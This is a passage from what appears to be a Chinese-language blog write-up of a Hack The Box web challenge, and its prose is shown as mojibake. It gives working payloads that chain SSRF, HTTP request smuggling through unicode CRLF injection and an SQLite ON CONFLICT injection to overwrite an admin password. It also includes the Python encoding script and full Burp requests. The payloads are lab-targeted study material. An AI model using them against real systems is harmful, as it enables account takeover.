<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?id=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9999	# è¿™é‡Œç”¨9999ç«¯å£ï¼Œå°±æ˜¯ä¸ºäº†è¯æ˜æˆ‘ä»¬ç›‘å¬çš„æ˜¯5000ç«¯å£ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†æ˜¯æˆ‘ä»¬èµ°ç§æŠ¥æ–‡æ¥æ§åˆ¶çš„ï¼Œå³å¯ä»¥äººä¸ºæ„é€ </span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=lemon&amp;password=lemon</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/test</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5000</span><br></pre></td></tr></table></figure>
<p>è½¬æ¢è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:9999</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /register HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 29</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=lemon&amp;password=lemon</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /test&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(payload.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\\u010D\\u010A&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0120&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼ŒæŠ¥æ–‡çš„å¤´å°¾æ˜¯ä¸éœ€è¦ä¸€äº›æ§åˆ¶çš„å­—æ®µï¼Œå› ä¸ºå‘èµ·è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨è¡¥é½ä¸€äº›å­—æ®µï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯â€èµ°ç§â€œä¸­é—´çš„æŠ¥æ–‡</p>
<p>test.jså†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">http.get(<span class="string">&quot;http://127.0.0.1:5000/?id=1\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:9999\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername=lemon&amp;password=lemon\u010D\u010A\u010D\u010AGET\u0120/test&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ç›‘å¬æœ¬æœºçš„5000ç«¯å£</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup nc -lvvp 5000 &gt;&gt; out.log &amp;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye5g4pctzj31ic0q8gq3.jpg" alt=""></p>
<p> å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å·²ç»æˆåŠŸè§£ææˆ‘ä»¬èµ°ç§çš„æŠ¥æ–‡</p>
<h4 id="åˆ©ç”¨ssrfæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·"><a href="#åˆ©ç”¨ssrfæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·" class="headerlink" title="åˆ©ç”¨ssrfæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·"></a>åˆ©ç”¨ssrfæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·</h4><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾ªåºæ¸è¿›ï¼Œé¦–å…ˆæ¥æ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·å‡ºæ¥</p>
<p>åˆ©ç”¨æ‰‹æ³•åŒä¸Šï¼Œæˆ‘ä»¬æ„é€ httpæŠ¥æ–‡å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=lemon&amp;password=lemon</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>
<p>è½¬æ¢è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /register HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 29</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=lemon&amp;password=lemon</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(payload.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\\u010D\\u010A&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0120&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120&#x2F;register\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application&#x2F;x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername&#x3D;lemon&amp;password&#x3D;lemon\u010D\u010A\u010D\u010AGET\u0120&#x2F;</span><br></pre></td></tr></table></figure>
<p>å‰é¢ç»‘å®šéœ€è¦è¯·æ±‚çš„åœ°å€å³127.0.0.1ï¼Œæœ€ç»ˆendpointä½ç‚¹å¤„çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120&#x2F;register\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application&#x2F;x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername&#x3D;lemon&amp;password&#x3D;lemon\u010D\u010A\u010D\u010AGET\u0120&#x2F;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨burpæ¥æ‰“ï¼ŒæŠ¥æ–‡å¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/weather</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:1337</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;40a-17749845bb8&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>376</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername=lemon&amp;password=lemon\u010D\u010A\u010D\u010AGET\u0120/&quot;,&quot;city&quot;:&quot;1&quot;,&quot;country&quot;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå»dockerä¸Šä¸‹è½½ä¸€ä¸ªsqliteï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¡¨ï¼š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye5g4vyq2j30io06yjrt.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»æ³¨å†ŒæˆåŠŸäº†ï¼ˆadminçš„ç”¨æˆ·å¯†ç ä¹‹å‰å·²ç»è¢«æˆ‘æ‰“è¿‡äº†ï¼Œæ‰€ä»¥å¯†ç ä¸æ˜¯éšæœºå€¼äº†ï¼‰</p>
<h4 id="sqlæ³¨å…¥çš„åˆ©ç”¨æ‰‹æ³•"><a href="#sqlæ³¨å…¥çš„åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="sqlæ³¨å…¥çš„åˆ©ç”¨æ‰‹æ³•"></a>sqlæ³¨å…¥çš„åˆ©ç”¨æ‰‹æ³•</h4><p>[ä½¿ç”¨INSERT ON CONFLICTè¦†ç›–å†™å…¥æ•°æ®][<a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/162380.html?utm_content=g_1000230851&amp;spm=5176.20966629.toubu.3.f2991ddcpxxvD1#title-ddu-6dl-bey">https://help.aliyun.com/document_detail/162380.html?utm_content=g_1000230851&amp;spm=5176.20966629.toubu.3.f2991ddcpxxvD1#title-ddu-6dl-bey</a>]</p>
<p>åˆ©ç”¨æ‰‹æ³•å°±æ˜¯åˆ©ç”¨å†²çªæ¥ä¿®æ”¹adminçš„å¯†ç ï¼Œå½“æˆ‘ä»¬æ³¨å†Œçš„æ—¶å€™ï¼Œå†æ¬¡æ³¨å†Œadminç”¨æˆ·å³ä¼šäº§ç”Ÿå†²çªã€‚</p>
<p>æ¼”ç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users(username, password) values(&#39;lemon&#39;, &#39;lemon&#39;) on conflict(username) do update set password&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye4fd58hfj31eu04gmxp.jpg" alt=""></p>
<h4 id="ç»„åˆæ‹³ä¿®æ”¹adminå¯†ç "><a href="#ç»„åˆæ‹³ä¿®æ”¹adminå¯†ç " class="headerlink" title="ç»„åˆæ‹³ä¿®æ”¹adminå¯†ç "></a>ç»„åˆæ‹³ä¿®æ”¹adminå¯†ç </h4><p>è¿˜æ˜¯åƒä¹‹å‰ä¸€æ ·æ„é€ ä¸€ä¸ªæ³¨å†ŒæŠ¥æ–‡ï¼Œä¸è¿‡payloadéœ€è¦æ”¹æˆå¸¦æœ‰sqlæ³¨å…¥çš„è¯­å¥ï¼Œsqlæ³¨å…¥çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;admin&#39;) on conflict(username) do update set password&#x3D;&#39;lemon_admin&#39; #</span><br></pre></td></tr></table></figure>
<p>bodyå¤„çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120&#x2F;register\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application&#x2F;x-www-form-urlencoded\u010D\u010AContent-Length:\u012099\u010D\u010A\u010D\u010Ausername&#x3D;admin&amp;password&#x3D;admin&#39;)+on+conflict(username)+do+update+set+password&#x3D;%27lemon_admin%27--+\u010D\u010A\u010D\u010AGET\u0120&#x2F;&quot;,&quot;city&quot;:&quot;1&quot;,&quot;country&quot;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>å‘åŒ…æŠ¥æ–‡å¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/weather</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:1337</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;40a-17749845bb8&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012099\u010D\u010A\u010D\u010Ausername=admin&amp;password=admin&#x27;)+on+CONFLICT(username)+do+update+set+password=%27lemon_admin%27--+\u010D\u010A\u010D\u010AGET\u0120/&quot;,&quot;city&quot;:&quot;1&quot;,&quot;country&quot;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>å¯†ç å·²ç»æˆåŠŸä¿®æ”¹ï¼š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye546pxluj30cw02u0sq.jpg" alt=""></p>
<!-- flag of hidden posts --></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/09/HTB-challenge-web/">http://example.com/2022/01/09/HTB-challenge-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://example.com">Alex's blog~</a>ï¼</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/web/">web</a></div><nav id="pagination"></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2025 By Alex</div><div class="framework-info"><span>é©±åŠ¨ - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>